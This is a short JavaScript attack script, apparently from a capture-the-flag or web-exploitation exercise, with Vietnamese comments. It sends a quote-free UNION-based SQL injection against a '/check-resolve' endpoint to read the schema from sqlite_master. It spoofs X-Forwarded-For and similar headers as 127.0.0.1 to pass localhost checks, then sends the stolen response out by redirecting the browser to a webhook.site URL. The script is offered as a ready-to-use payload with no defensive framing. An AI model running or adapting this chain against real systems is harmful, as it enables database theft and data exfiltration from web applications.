let formData = new URLSearchParams();

// KHÔNG dùng bất kỳ dấu nháy nào. 
// Lấy dòng đầu tiên trong bảng cấu trúc Database, đặt tên cột là resolve để khớp với JSON
formData.append('id', '-1 UNION SELECT sql AS resolve FROM sqlite_master LIMIT 1 OFFSET 0');

fetch('/check-resolve', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '127.0.0.1',
        'X-Real-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1'
    },
    body: formData.toString()
})
.then(response => response.text())
.then(data => {
    window.location = 'https://webhook.site/2fc3e3e9-24dd-4048-91c9-b5cc45619d1d/?result=' + encodeURIComponent(data);
});